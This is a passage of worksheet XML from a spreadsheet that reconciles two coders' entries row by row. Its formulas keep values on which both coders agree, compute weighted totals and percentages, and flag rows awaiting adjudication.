        <f>IF(AND(Coder1!V155&amp;""&lt;&gt;"",Coder1!V155&amp;""=Coder2!V155&amp;""),Coder1!V155,"")</f>
        <v/>
      </c>
      <c r="W155" s="14">
        <f>IF(AND(Coder1!W155&amp;""&lt;&gt;"",Coder1!W155&amp;""=Coder2!W155&amp;""),Coder1!W155,"")</f>
        <v/>
      </c>
      <c r="X155" s="14">
        <f>IF(AND(Coder1!X155&amp;""&lt;&gt;"",Coder1!X155&amp;""=Coder2!X155&amp;""),Coder1!X155,"")</f>
        <v/>
      </c>
      <c r="Y155" s="14">
        <f>IF(AND(Coder1!Y155&amp;""&lt;&gt;"",Coder1!Y155&amp;""=Coder2!Y155&amp;""),Coder1!Y155,"")</f>
        <v/>
      </c>
      <c r="Z155" s="14">
        <f>IF(AND(Coder1!Z155&amp;""&lt;&gt;"",Coder1!Z155&amp;""=Coder2!Z155&amp;""),Coder1!Z155,"")</f>
        <v/>
      </c>
      <c r="AA155" s="14">
        <f>IF(AND(Coder1!AA155&amp;""&lt;&gt;"",Coder1!AA155&amp;""=Coder2!AA155&amp;""),Coder1!AA155,"")</f>
        <v/>
      </c>
      <c r="AB155" s="14">
        <f>IF(AND(Coder1!AB155&amp;""&lt;&gt;"",Coder1!AB155&amp;""=Coder2!AB155&amp;""),Coder1!AB155,"")</f>
        <v/>
      </c>
      <c r="AC155" s="14">
        <f>IF(AND(Coder1!AC155&amp;""&lt;&gt;"",Coder1!AC155&amp;""=Coder2!AC155&amp;""),Coder1!AC155,"")</f>
        <v/>
      </c>
      <c r="AD155" s="14">
        <f>IF(AND(Coder1!AD155&amp;""&lt;&gt;"",Coder1!AD155&amp;""=Coder2!AD155&amp;""),Coder1!AD155,"")</f>
        <v/>
      </c>
      <c r="AE155" s="14">
        <f>IF(AND(Coder1!AE155&amp;""&lt;&gt;"",Coder1!AE155&amp;""=Coder2!AE155&amp;""),Coder1!AE155,"")</f>
        <v/>
      </c>
      <c r="AF155" s="14">
        <f>IF(AND(Coder1!AF155&amp;""&lt;&gt;"",Coder1!AF155&amp;""=Coder2!AF155&amp;""),Coder1!AF155,"")</f>
        <v/>
      </c>
      <c r="AG155" s="14">
        <f>IF(AND(Coder1!AG155&amp;""&lt;&gt;"",Coder1!AG155&amp;""=Coder2!AG155&amp;""),Coder1!AG155,"")</f>
        <v/>
      </c>
      <c r="AH155" s="14">
        <f>IF(AND(Coder1!AH155&amp;""&lt;&gt;"",Coder1!AH155&amp;""=Coder2!AH155&amp;""),Coder1!AH155,"")</f>
        <v/>
      </c>
      <c r="AI155" s="11">
        <f>IF(COUNT(E155:L155)=0,"",SUM(E155:L155))</f>
        <v/>
      </c>
      <c r="AJ155" s="11">
        <f>IF(AI155="","",N(E155)*3+N(F155)*2+N(G155)*2+N(H155)*2+N(I155)*2+N(J155)*3+N(K155)*3+N(L155)*3)</f>
        <v/>
      </c>
      <c r="AK155" s="11">
        <f>IF(AI155="","",COUNTIF(N155:AG155,1))</f>
        <v/>
      </c>
      <c r="AL155" s="11">
        <f>IF(OR(AJ155="",AJ155=0),"",ROUND(100*(AJ155-AK155)/AJ155,1))</f>
        <v/>
      </c>
      <c r="AM155" s="11">
        <f>IF(AND(Coder1!AN155=1,Coder2!AN155=1),IF(COUNTBLANK(E155:AH155)&gt;0,"Adjudicate blank cells",""),"Waiting for both coders")</f>
        <v/>
      </c>
      <c r="AN155" s="11">
        <f>IF(AND(Coder1!AN155=1,Coder2!AN155=1),IF(SUMPRODUCT(--(Coder1!E155:AH155&amp;""&lt;&gt;Coder2!E155:AH155&amp;""))=0,1,0),"")</f>
        <v/>
      </c>
      <c r="AO155" s="11" t="n"/>
    </row>
    <row r="156">
      <c r="A156" s="11">
        <f>Coder1!A156</f>
        <v/>
      </c>
      <c r="B156" s="11">
        <f>Coder1!B156</f>
        <v/>
      </c>
      <c r="C156" s="11">
        <f>Coder1!C156</f>
        <v/>
      </c>
      <c r="D156" s="11">
        <f>Coder1!D156</f>
        <v/>
      </c>
      <c r="E156" s="14">
        <f>IF(AND(Coder1!E156&amp;""&lt;&gt;"",Coder1!E156&amp;""=Coder2!E156&amp;""),Coder1!E156,"")</f>
        <v/>
      </c>
      <c r="F156" s="14">
        <f>IF(AND(Coder1!F156&amp;""&lt;&gt;"",Coder1!F156&amp;""=Coder2!F156&amp;""),Coder1!F156,"")</f>
        <v/>
      </c>
      <c r="G156" s="14">
        <f>IF(AND(Coder1!G156&amp;""&lt;&gt;"",Coder1!G156&amp;""=Coder2!G156&amp;""),Coder1!G156,"")</f>
        <v/>
      </c>
      <c r="H156" s="14">
        <f>IF(AND(Coder1!H156&amp;""&lt;&gt;"",Coder1!H156&amp;""=Coder2!H156&amp;""),Coder1!H156,"")</f>
        <v/>
      </c>
      <c r="I156" s="14">
        <f>IF(AND(Coder1!I156&amp;""&lt;&gt;"",Coder1!I156&amp;""=Coder2!I156&amp;""),Coder1!I156,"")</f>
        <v/>
      </c>
      <c r="J156" s="14">
        <f>IF(AND(Coder1!J156&amp;""&lt;&gt;"",Coder1!J156&amp;""=Coder2!J156&amp;""),Coder1!J156,"")</f>
        <v/>
      </c>
      <c r="K156" s="14">
        <f>IF(AND(Coder1!K156&amp;""&lt;&gt;"",Coder1!K156&amp;""=Coder2!K156&amp;""),Coder1!K156,"")</f>
        <v/>
      </c>
      <c r="L156" s="14">
        <f>IF(AND(Coder1!L156&amp;""&lt;&gt;"",Coder1!L156&amp;""=Coder2!L156&amp;""),Coder1!L156,"")</f>
        <v/>
      </c>
      <c r="M156" s="14">
        <f>IF(AND(Coder1!M156&amp;""&lt;&gt;"",Coder1!M156&amp;""=Coder2!M156&amp;""),Coder1!M156,"")</f>
        <v/>
      </c>
      <c r="N156" s="14">
        <f>IF(AND(Coder1!N156&amp;""&lt;&gt;"",Coder1!N156&amp;""=Coder2!N156&amp;""),Coder1!N156,"")</f>
        <v/>
      </c>
      <c r="O156" s="14">
        <f>IF(AND(Coder1!O156&amp;""&lt;&gt;"",Coder1!O156&amp;""=Coder2!O156&amp;""),Coder1!O156,"")</f>
        <v/>
      </c>
      <c r="P156" s="14">
        <f>IF(AND(Coder1!P156&amp;""&lt;&gt;"",Coder1!P156&amp;""=Coder2!P156&amp;""),Coder1!P156,"")</f>
        <v/>
      </c>
      <c r="Q156" s="14">
        <f>IF(AND(Coder1!Q156&amp;""&lt;&gt;"",Coder1!Q156&amp;""=Coder2!Q156&amp;""),Coder1!Q156,"")</f>
        <v/>
      </c>
      <c r="R156" s="14">
        <f>IF(AND(Coder1!R156&amp;""&lt;&gt;"",Coder1!R156&amp;""=Coder2!R156&amp;""),Coder1!R156,"")</f>
        <v/>
      </c>
      <c r="S156" s="14">
        <f>IF(AND(Coder1!S156&amp;""&lt;&gt;"",Coder1!S156&amp;""=Coder2!S156&amp;""),Coder1!S156,"")</f>
        <v/>
      </c>
      <c r="T156" s="14">
        <f>IF(AND(Coder1!T156&amp;""&lt;&gt;"",Coder1!T156&amp;""=Coder2!T156&amp;""),Coder1!T156,"")</f>
        <v/>
      </c>
      <c r="U156" s="14">
        <f>IF(AND(Coder1!U156&amp;""&lt;&gt;"",Coder1!U156&amp;""=Coder2!U156&amp;""),Coder1!U156,"")</f>
        <v/>
      </c>
      <c r="V156" s="14">
        <f>IF(AND(Coder1!V156&amp;""&lt;&gt;"",Coder1!V156&amp;""=Coder2!V156&amp;""),Coder1!V156,"")</f>
        <v/>
      </c>
      <c r="W156" s="14">
        <f>IF(AND(Coder1!W156&amp;""&lt;&gt;"",Coder1!W156&amp;""=Coder2!W156&amp;""),Coder1!W156,"")</f>
        <v/>
      </c>
      <c r="X156" s="14">
        <f>IF(AND(Coder1!X156&amp;""&lt;&gt;"",Coder1!X156&amp;""=Coder2!X156&amp;""),Coder1!X156,"")</f>
        <v/>
      </c>
      <c r="Y156" s="14">
        <f>IF(AND(Coder1!Y156&amp;""&lt;&gt;"",Coder1!Y156&amp;""=Coder2!Y156&amp;""),Coder1!Y156,"")</f>
        <v/>
      </c>
      <c r="Z156" s="14">
        <f>IF(AND(Coder1!Z156&amp;""&lt;&gt;"",Coder1!Z156&amp;""=Coder2!Z156&amp;""),Coder1!Z156,"")</f>
        <v/>
      </c>
      <c r="AA156" s="14">
        <f>IF(AND(Coder1!AA156&amp;""&lt;&gt;"",Coder1!AA156&amp;""=Coder2!AA156&amp;""),Coder1!AA156,"")</f>
        <v/>
      </c>
      <c r="AB156" s="14">
        <f>IF(AND(Coder1!AB156&amp;""&lt;&gt;"",Coder1!AB156&amp;""=Coder2!AB156&amp;""),Coder1!AB156,"")</f>
        <v/>
      </c>
      <c r="AC156" s="14">
        <f>IF(AND(Coder1!AC156&amp;""&lt;&gt;"",Coder1!AC156&amp;""=Coder2!AC156&amp;""),Coder1!AC156,"")</f>
        <v/>
      </c>
      <c r="AD156" s="14">
        <f>IF(AND(Coder1!AD156&amp;""&lt;&gt;"",Coder1!AD156&amp;""=Coder2!AD156&amp;""),Coder1!AD156,"")</f>
        <v/>
      </c>
      <c r="AE156" s="14">
        <f>IF(AND(Coder1!AE156&amp;""&lt;&gt;"",Coder1!AE156&amp;""=Coder2!AE156&amp;""),Coder1!AE156,"")</f>
        <v/>
      </c>
      <c r="AF156" s="14">
        <f>IF(AND(Coder1!AF156&amp;""&lt;&gt;"",Coder1!AF156&amp;""=Coder2!AF156&amp;""),Coder1!AF156,"")</f>
        <v/>
      </c>
      <c r="AG156" s="14">
        <f>IF(AND(Coder1!AG156&amp;""&lt;&gt;"",Coder1!AG156&amp;""=Coder2!AG156&amp;""),Coder1!AG156,"")</f>
        <v/>
      </c>
      <c r="AH156" s="14">
        <f>IF(AND(Coder1!AH156&amp;""&lt;&gt;"",Coder1!AH156&amp;""=Coder2!AH156&amp;""),Coder1!AH156,"")</f>
        <v/>
      </c>
      <c r="AI156" s="11">
        <f>IF(COUNT(E156:L156)=0,"",SUM(E156:L156))</f>
        <v/>
      </c>
      <c r="AJ156" s="11">
        <f>IF(AI156="","",N(E156)*3+N(F156)*2+N(G156)*2+N(H156)*2+N(I156)*2+N(J156)*3+N(K156)*3+N(L156)*3)</f>
        <v/>
      </c>
      <c r="AK156" s="11">
        <f>IF(AI156="","",COUNTIF(N156:AG156,1))</f>
        <v/>
      </c>
      <c r="AL156" s="11">
        <f>IF(OR(AJ156="",AJ156=0),"",ROUND(100*(AJ156-AK156)/AJ156,1))</f>
        <v/>
      </c>
      <c r="AM156" s="11">
        <f>IF(AND(Coder1!AN156=1,Coder2!AN156=1),IF(COUNTBLANK(E156:AH156)&gt;0,"Adjudicate blank cells",""),"Waiting for both coders")</f>
        <v/>
      </c>
      <c r="AN156" s="11">
        <f>IF(AND(Coder1!AN156=1,Coder2!AN156=1),IF(SUMPRODUCT(--(Coder1!E156:AH156&amp;""&lt;&gt;Coder2!E156:AH156&amp;""))=0,1,0),"")</f>
        <v/>
      </c>
      <c r="AO156" s="11" t="n"/>
    </row>
    <row r="157">
      <c r="A157" s="11">
        <f>Coder1!A157</f>
        <v/>
      </c>
      <c r="B157" s="11">
        <f>Coder1!B157</f>
        <v/>
      </c>
      <c r="C157" s="11">
        <f>Coder1!C157</f>
        <v/>
      </c>
      <c r="D157" s="11">
        <f>Coder1!D157</f>
        <v/>
      </c>
      <c r="E157" s="14">
        <f>IF(AND(Coder1!E157&amp;""&lt;&gt;"",Coder1!E157&amp;""=Coder2!E157&amp;""),Coder1!E157,"")</f>
        <v/>
      </c>
      <c r="F157" s="14">
        <f>IF(AND(Coder1!F157&amp;""&lt;&gt;"",Coder1!F157&amp;""=Coder2!F157&amp;""),Coder1!F157,"")</f>
        <v/>
      </c>
      <c r="G157" s="14">
        <f>IF(AND(Coder1!G157&amp;""&lt;&gt;"",Coder1!G157&amp;""=Coder2!G157&amp;""),Coder1!G157,"")</f>
        <v/>
      </c>
      <c r="H157" s="14">
        <f>IF(AND(Coder1!H157&amp;""&lt;&gt;"",Coder1!H157&amp;""=Coder2!H157&amp;""),Coder1!H157,"")</f>
        <v/>
      </c>
      <c r="I157" s="14">
        <f>IF(AND(Coder1!I157&amp;""&lt;&gt;"",Coder1!I157&amp;""=Coder2!I157&amp;""),Coder1!I157,"")</f>
        <v/>
      </c>
      <c r="J157" s="14">
        <f>IF(AND(Coder1!J157&amp;""&lt;&gt;"",Coder1!J157&amp;""=Coder2!J157&amp;""),Coder1!J157,"")</f>
        <v/>
      </c>
      <c r="K157" s="14">
        <f>IF(AND(Coder1!K157&amp;""&lt;&gt;"",Coder1!K157&amp;""=Coder2!K157&amp;""),Coder1!K157,"")</f>
        <v/>
      </c>
      <c r="L157" s="14">
        <f>IF(AND(Coder1!L157&amp;""&lt;&gt;"",Coder1!L157&amp;""=Coder2!L157&amp;""),Coder1!L157,"")</f>
        <v/>
      </c>
      <c r="M157" s="14">
        <f>IF(AND(Coder1!M157&amp;""&lt;&gt;"",Coder1!M157&amp;""=Coder2!M157&amp;""),Coder1!M157,"")</f>
        <v/>
      </c>
      <c r="N157" s="14">
        <f>IF(AND(Coder1!N157&amp;""&lt;&gt;"",Coder1!N157&amp;""=Coder2!N157&amp;""),Coder1!N157,"")</f>
        <v/>
      </c>
      <c r="O157" s="14">
        <f>IF(AND(Coder1!O157&amp;""&lt;&gt;"",Coder1!O157&amp;""=Coder2!O157&amp;""),Coder1!O157,"")</f>
        <v/>
      </c>
      <c r="P157" s="14">
        <f>IF(AND(Coder1!P157&amp;""&lt;&gt;"",Coder1!P157&amp;""=Coder2!P157&amp;""),Coder1!P157,"")</f>
        <v/>
      </c>
      <c r="Q157" s="14">
        <f>IF(AND(Coder1!Q157&amp;""&lt;&gt;"",Coder1!Q157&amp;""=Coder2!Q157&amp;""),Coder1!Q157,"")</f>
        <v/>
      </c>
      <c r="R157" s="14">
        <f>IF(AND(Coder1!R157&amp;""&lt;&gt;"",Coder1!R157&amp;""=Coder2!R157&amp;""),Coder1!R157,"")</f>
        <v/>
      </c>
      <c r="S157" s="14">
        <f>IF(AND(Coder1!S157&amp;""&lt;&gt;"",Coder1!S157&amp;""=Coder2!S157&amp;""),Coder1!S157,"")</f>
        <v/>
      </c>
      <c r="T157" s="14">
        <f>IF(AND(Coder1!T157&amp;""&lt;&gt;"",Coder1!T157&amp;""=Coder2!T157&amp;""),Coder1!T157,"")</f>
        <v/>
      </c>
      <c r="U157" s="14">
        <f>IF(AND(Coder1!U157&amp;""&lt;&gt;"",Coder1!U157&amp;""=Coder2!U157&amp;""),Coder1!U157,"")</f>
        <v/>
      </c>
      <c r="V157" s="14">
        <f>IF(AND(Coder1!V157&amp;""&lt;&gt;"",Coder1!V157&amp;""=Coder2!V157&amp;""),Coder1!V157,"")</f>
        <v/>
      </c>
      <c r="W157" s="14">
        <f>IF(AND(Coder1!W157&amp;""&lt;&gt;"",Coder1!W157&amp;""=Coder2!W157&amp;""),Coder1!W157,"")</f>
        <v/>
      </c>
      <c r="X157" s="14">
        <f>IF(AND(Coder1!X157&amp;""&lt;&gt;"",Coder1!X157&amp;""=Coder2!X157&amp;""),Coder1!X157,"")</f>
        <v/>
      </c>
      <c r="Y157" s="14">
        <f>IF(AND(Coder1!Y157&amp;""&lt;&gt;"",Coder1!Y157&amp;""=Coder2!Y157&amp;""),Coder1!Y157,"")</f>
        <v/>
      </c>
      <c r="Z157" s="14">
        <f>IF(AND(Coder1!Z157&amp;""&lt;&gt;"",Coder1!Z157&amp;""=Coder2!Z157&amp;""),Coder1!Z157,"")</f>
        <v/>
      </c>
      <c r="AA157" s="14">
        <f>IF(AND(Coder1!AA157&amp;""&lt;&gt;"",Coder1!AA157&amp;""=Coder2!AA157&amp;""),Coder1!AA157,"")</f>
        <v/>
      </c>
      <c r="AB157" s="14">
        <f>IF(AND(Coder1!AB157&amp;""&lt;&gt;"",Coder1!AB157&amp;""=Coder2!AB157&amp;""),Coder1!AB157,"")</f>
        <v/>
      </c>
      <c r="AC157" s="14">
        <f>IF(AND(Coder1!AC157&amp;""&lt;&gt;"",Coder1!AC157&amp;""=Coder2!AC157&amp;""),Coder1!AC157,"")</f>
        <v/>
      </c>
      <c r="AD157" s="14">
        <f>IF(AND(Coder1!AD157&amp;""&lt;&gt;"",Coder1!AD157&amp;""=Coder2!AD157&amp;""),Coder1!AD157,"")</f>
        <v/>
      </c>
      <c r="AE157" s="14">
        <f>IF(AND(Coder1!AE157&amp;""&lt;&gt;"",Coder1!AE157&amp;""=Coder2!AE157&amp;""),Coder1!AE157,"")</f>
        <v/>
      </c>
      <c r="AF157" s="14">
        <f>IF(AND(Coder1!AF157&amp;""&lt;&gt;"",Coder1!AF157&amp;""=Coder2!AF157&amp;""),Coder1!AF157,"")</f>
        <v/>
      </c>
      <c r="AG157" s="14">
        <f>IF(AND(Coder1!AG157&amp;""&lt;&gt;"",Coder1!AG157&amp;""=Coder2!AG157&amp;""),Coder1!AG157,"")</f>
        <v/>
      </c>
      <c r="AH157" s="14">
        <f>IF(AND(Coder1!AH157&amp;""&lt;&gt;"",Coder1!AH157&amp;""=Coder2!AH157&amp;""),Coder1!AH157,"")</f>
        <v/>
      </c>
      <c r="AI157" s="11">
        <f>IF(COUNT(E157:L157)=0,"",SUM(E157:L157))</f>
        <v/>
      </c>
      <c r="AJ157" s="11">
        <f>IF(AI157="","",N(E157)*3+N(F157)*2+N(G157)*2+N(H157)*2+N(I157)*2+N(J157)*3+N(K157)*3+N(L157)*3)</f>
        <v/>
      </c>
      <c r="AK157" s="11">
        <f>IF(AI157="","",COUNTIF(N157:AG157,1))</f>
        <v/>
      </c>
      <c r="AL157" s="11">
        <f>IF(OR(AJ157="",AJ157=0),"",ROUND(100*(AJ157-AK157)/AJ157,1))</f>
        <v/>
      </c>
      <c r="AM157" s="11">
        <f>IF(AND(Coder1!AN157=1,Coder2!AN157=1),IF(COUNTBLANK(E157:AH157)&gt;0,"Adjudicate blank cells",""),"Waiting for both coders")</f>
        <v/>
      </c>
      <c r="AN157" s="11">
        <f>IF(AND(Coder1!AN157=1,Coder2!AN157=1),IF(SUMPRODUCT(--(Coder1!E157:AH157&amp;""&lt;&gt;Coder2!E157:AH157&amp;""))=0,1,0),"")</f>
        <v/>
      </c>
      <c r="AO157" s="11" t="n"/>
    </row>
    <row r="158">
      <c r="A158" s="11">
        <f>Coder1!A158</f>
        <v/>
      </c>
      <c r="B158" s="11">
        <f>Coder1!B158</f>
        <v/>
      </c>
      <c r="C158" s="11">
        <f>Coder1!C158</f>
        <v/>
      </c>
      <c r="D158" s="11">
        <f>Coder1!D158</f>
        <v/>
      </c>
      <c r="E158" s="14">
        <f>IF(AND(Coder1!E158&amp;""&lt;&gt;"",Coder1!E158&amp;""=Coder2!E158&amp;""),Coder1!E158,"")</f>
        <v/>
      </c>
      <c r="F158" s="14">
        <f>IF(AND(Coder1!F158&amp;""&lt;&gt;"",Coder1!F158&amp;""=Coder2!F158&amp;""),Coder1!F158,"")</f>
        <v/>
      </c>
      <c r="G158" s="14">
        <f>IF(AND(Coder1!G158&amp;""&lt;&gt;"",Coder1!G158&amp;""=Coder2!G158&amp;""),Coder1!G158,"")</f>
        <v/>
      </c>
      <c r="H158" s="14">
        <f>IF(AND(Coder1!H158&amp;""&lt;&gt;"",Coder1!H158&amp;""=Coder2!H158&amp;""),Coder1!H158,"")</f>
        <v/>
      </c>
      <c r="I158" s="14">
        <f>IF(AND(Coder1!I158&amp;""&lt;&gt;"",Coder1!I158&amp;""=Coder2!I158&amp;""),Coder1!I158,"")</f>
        <v/>
      </c>
      <c r="J158" s="14">
        <f>IF(AND(Coder1!J158&amp;""&lt;&gt;"",Coder1!J158&amp;""=Coder2!J158&amp;""),Coder1!J158,"")</f>
        <v/>
      </c>
      <c r="K158" s="14">
        <f>IF(AND(Coder1!K158&amp;""&lt;&gt;"",Coder1!K158&amp;""=Coder2!K158&amp;""),Coder1!K158,"")</f>
        <v/>
      </c>
      <c r="L158" s="14">
        <f>IF(AND(Coder1!L158&amp;""&lt;&gt;"",Coder1!L158&amp;""=Coder2!L158&amp;""),Coder1!L158,"")</f>
        <v/>
      </c>
      <c r="M158" s="14">
        <f>IF(AND(Coder1!M158&amp;""&lt;&gt;"",Coder1!M158&amp;""=Coder2!M158&amp;""),Coder1!M158,"")</f>
        <v/>
      </c>
      <c r="N158" s="14">
        <f>IF(AND(Coder1!N158&amp;""&lt;&gt;"",Coder1!N158&amp;""=Coder2!N158&amp;""),Coder1!N158,"")</f>
        <v/>
      </c>
      <c r="O158" s="14">
        <f>IF(AND(Coder1!O158&amp;""&lt;&gt;"",Coder1!O158&amp;""=Coder2!O158&amp;""),Coder1!O158,"")</f>
        <v/>
      </c>
      <c r="P158" s="14">
        <f>IF(AND(Coder1!P158&amp;""&lt;&gt;"",Coder1!P158&amp;""=Coder2!P158&amp;""),Coder1!P158,"")</f>
        <v/>
      </c>
      <c r="Q158" s="14">
        <f>IF(AND(Coder1!Q158&amp;""&lt;&gt;"",Coder1!Q158&amp;""=Coder2!Q158&amp;""),Coder1!Q158,"")</f>
        <v/>
      </c>
      <c r="R158" s="14">
        <f>IF(AND(Coder1!R158&amp;""&lt;&gt;"",Coder1!R158&amp;""=Coder2!R158&amp;""),Coder1!R158,"")</f>
        <v/>
      </c>
      <c r="S158" s="14">
        <f>IF(AND(Coder1!S158&amp;""&lt;&gt;"",Coder1!S158&amp;""=Coder2!S158&amp;""),Coder1!S158,"")</f>
        <v/>
      </c>
      <c r="T158" s="14">
        <f>IF(AND(Coder1!T158&amp;""&lt;&gt;"",Coder1!T158&amp;""=Coder2!T158&amp;""),Coder1!T158,"")</f>
        <v/>
      </c>
      <c r="U158" s="14">
        <f>IF(AND(Coder1!U158&amp;""&lt;&gt;"",Coder1!U158&amp;""=Coder2!U158&amp;""),Coder1!U158,"")</f>
        <v/>
      </c>
      <c r="V158" s="14">
        <f>IF(AND(Coder1!V158&amp;""&lt;&gt;"",Coder1!V158&amp;""=Coder2!V158&amp;""),Coder1!V158,"")</f>
        <v/>
      </c>
      <c r="W158" s="14">
        <f>IF(AND(Coder1!W158&amp;""&lt;&gt;"",Coder1!W158&amp;""=Coder2!W158&amp;""),Coder1!W158,"")</f>
        <v/>
      </c>
      <c r="X158" s="14">
        <f>IF(AND(Coder1!X158&amp;""&lt;&gt;"",Coder1!X158&amp;""=Coder2!X158&amp;""),Coder1!X158,"")</f>
        <v/>
      </c>
      <c r="Y158" s="14">
        <f>IF(AND(Coder1!Y158&amp;""&lt;&gt;"",Coder1!Y158&amp;""=Coder2!Y158&amp;""),Coder1!Y158,"")</f>
        <v/>
      </c>
      <c r="Z158" s="14">
        <f>IF(AND(Coder1!Z158&amp;""&lt;&gt;"",Coder1!Z158&amp;""=Coder2!Z158&amp;""),Coder1!Z158,"")</f>
        <v/>
      </c>
      <c r="AA158" s="14">
        <f>IF(AND(Coder1!AA158&amp;""&lt;&gt;"",Coder1!AA158&amp;""=Coder2!AA158&amp;""),Coder1!AA158,"")</f>
        <v/>
      </c>
      <c r="AB158" s="14">
        <f>IF(AND(Coder1!AB158&amp;""&lt;&gt;"",Coder1!AB158&amp;""=Coder2!AB158&amp;""),Coder1!AB158,"")</f>
        <v/>
      </c>
      <c r="AC158" s="14">
        <f>IF(AND(Coder1!AC158&amp;""&lt;&gt;"",Coder1!AC158&amp;""=Coder2!AC158&amp;""),Coder1!AC158,"")</f>
        <v/>
      </c>
      <c r="AD158" s="14">
        <f>IF(AND(Coder1!AD158&amp;""&lt;&gt;"",Coder1!AD158&amp;""=Coder2!AD158&amp;""),Coder1!AD158,"")</f>
        <v/>
      </c>
      <c r="AE158" s="14">
        <f>IF(AND(Coder1!AE158&amp;""&lt;&gt;"",Coder1!AE158&amp;""=Coder2!AE158&amp;""),Coder1!AE158,"")</f>
        <v/>
      </c>
      <c r="AF158" s="14">
        <f>IF(AND(Coder1!AF158&amp;""&lt;&gt;"",Coder1!AF158&amp;""=Coder2!AF158&amp;""),Coder1!AF158,"")</f>
        <v/>
      </c>
      <c r="AG158" s="14">
        <f>IF(AND(Coder1!AG158&amp;""&lt;&gt;"",Coder1!AG158&amp;""=Coder2!AG158&amp;""),Coder1!AG158,"")</f>
        <v/>
      </c>
      <c r="AH158" s="14">
        <f>IF(AND(Coder1!AH158&amp;""&lt;&gt;"",Coder1!AH158&amp;""=Coder2!AH158&amp;""),Coder1!AH158,"")</f>
        <v/>
      </c>
      <c r="AI158" s="11">
        <f>IF(COUNT(E158:L158)=0,"",SUM(E158:L158))</f>
        <v/>
      </c>
      <c r="AJ158" s="11">
        <f>IF(AI158="","",N(E158)*3+N(F158)*2+N(G158)*2+N(H158)*2+N(I158)*2+N(J158)*3+N(K158)*3+N(L158)*3)</f>
        <v/>
      </c>
      <c r="AK158" s="11">
        <f>IF(AI158="","",COUNTIF(N158:AG158,1))</f>
        <v/>
      </c>
      <c r="AL158" s="11">
        <f>IF(OR(AJ158="",AJ158=0),"",ROUND(100*(AJ158-AK158)/AJ158,1))</f>
        <v/>
      </c>
      <c r="AM158" s="11">
        <f>IF(AND(Coder1!AN158=1,Coder2!AN158=1),IF(COUNTBLANK(E158:AH158)&gt;0,"Adjudicate blank cells",""),"Waiting for both coders")</f>
        <v/>
      </c>
      <c r="AN158" s="11">
        <f>IF(AND(Coder1!AN158=1,Coder2!AN158=1),IF(SUMPRODUCT(--(Coder1!E158:AH158&amp;""&lt;&gt;Coder2!E158:AH158&amp;""))=0,1,0),"")</f>
        <v/>
      </c>
      <c r="AO158" s="11" t="n"/>
    </row>
    <row r="159">
      <c r="A159" s="11">
        <f>Coder1!A159</f>
        <v/>
      </c>
      <c r="B159" s="11">
        <f>Coder1!B159</f>
        <v/>
      </c>
      <c r="C159" s="11">
        <f>Coder1!C159</f>
        <v/>
      </c>
      <c r="D159" s="11">
        <f>Coder1!D159</f>
        <v/>
      </c>
      <c r="E159" s="14">
        <f>IF(AND(Coder1!E159&amp;""&lt;&gt;"",Coder1!E159&amp;""=Coder2!E159&amp;""),Coder1!E159,"")</f>
        <v/>
      </c>
      <c r="F159" s="14">
        <f>IF(AND(Coder1!F159&amp;""&lt;&gt;"",Coder1!F159&amp;""=Coder2!F159&amp;""),Coder1!F159,"")</f>
        <v/>
      </c>
      <c r="G159" s="14">
        <f>IF(AND(Coder1!G159&amp;""&lt;&gt;"",Coder1!G159&amp;""=Coder2!G159&amp;""),Coder1!G159,"")</f>
        <v/>
      </c>
      <c r="H159" s="14">
        <f>IF(AND(Coder1!H159&amp;""&lt;&gt;"",Coder1!H159&amp;""=Coder2!H159&amp;""),Coder1!H159,"")</f>
        <v/>
      </c>
      <c r="I159" s="14">
        <f>IF(AND(Coder1!I159&amp;""&lt;&gt;"",Coder1!I159&amp;""=Coder2!I159&amp;""),Coder1!I159,"")</f>
        <v/>
      </c>
      <c r="J159" s="14">
        <f>IF(AND(Coder1!J159&amp;""&lt;&gt;"",Coder1!J159&amp;""=Coder2!J159&amp;""),Coder1!J159,"")</f>
        <v/>
      </c>
      <c r="K159" s="14">
        <f>IF(AND(Coder1!K159&amp;""&lt;&gt;"",Coder1!K159&amp;""=Coder2!K159&amp;""),Coder1!K159,"")</f>
        <v/>
      </c>
      <c r="L159" s="14">
        <f>IF(AND(Coder1!L159&amp;""&lt;&gt;"",Coder1!L159&amp;""=Coder2!L159&amp;""),Coder1!L159,"")</f>
        <v/>
      </c>
      <c r="M159" s="14">
        <f>IF(AND(Coder1!M159&amp;""&lt;&gt;"",Coder1!M159&amp;""=Coder2!M159&amp;""),Coder1!M159,"")</f>
        <v/>
      </c>
      <c r="N159" s="14">
        <f>IF(AND(Coder1!N159&amp;""&lt;&gt;"",Coder1!N159&amp;""=Coder2!N159&amp;""),Coder1!N159,"")</f>
        <v/>
      </c>
      <c r="O159" s="14">
        <f>IF(AND(Coder1!O159&amp;""&lt;&gt;"",Coder1!O159&amp;""=Coder2!O159&amp;""),Coder1!O159,"")</f>
        <v/>
      </c>
      <c r="P159" s="14">
        <f>IF(AND(Coder1!P159&amp;""&lt;&gt;"",Coder1!P159&amp;""=Coder2!P159&amp;""),Coder1!P159,"")</f>
        <v/>
      </c>
      <c r="Q159" s="14">
        <f>IF(AND(Coder1!Q159&amp;""&lt;&gt;"",Coder1!Q159&amp;""=Coder2!Q159&amp;""),Coder1!Q159,"")</f>
        <v/>
      </c>
      <c r="R159" s="14">
        <f>IF(AND(Coder1!R159&amp;""&lt;&gt;"",Coder1!R159&amp;""=Coder2!R159&amp;""),Coder1!R159,"")</f>
        <v/>
      </c>
      <c r="S159" s="14">
        <f>IF(AND(Coder1!S159&amp;""&lt;&gt;"",Coder1!S159&amp;""=Coder2!S159&amp;""),Coder1!S159,"")</f>
        <v/>
      </c>
      <c r="T159" s="14">
        <f>IF(AND(Coder1!T159&amp;""&lt;&gt;"",Coder1!T159&amp;""=Coder2!T159&amp;""),Coder1!T159,"")</f>
        <v/>
      </c>
      <c r="U159" s="14">
        <f>IF(AND(Coder1!U159&amp;""&lt;&gt;"",Coder1!U159&amp;""=Coder2!U159&amp;""),Coder1!U159,"")</f>
        <v/>
      </c>
      <c r="V159" s="14">
        <f>IF(AND(Coder1!V159&amp;""&lt;&gt;"",Coder1!V159&amp;""=Coder2!V159&amp;""),Coder1!V159,"")</f>
        <v/>
      </c>
      <c r="W159" s="14">
        <f>IF(AND(Coder1!W159&amp;""&lt;&gt;"",Coder1!W159&amp;""=Coder2!W159&amp;""),Coder1!W159,"")</f>
        <v/>
      </c>
      <c r="X159" s="14">
        <f>IF(AND(Coder1!X159&amp;""&lt;&gt;"",Coder1!X159&amp;""=Coder2!X159&amp;""),Coder1!X159,"")</f>
        <v/>
      </c>
      <c r="Y159" s="14">
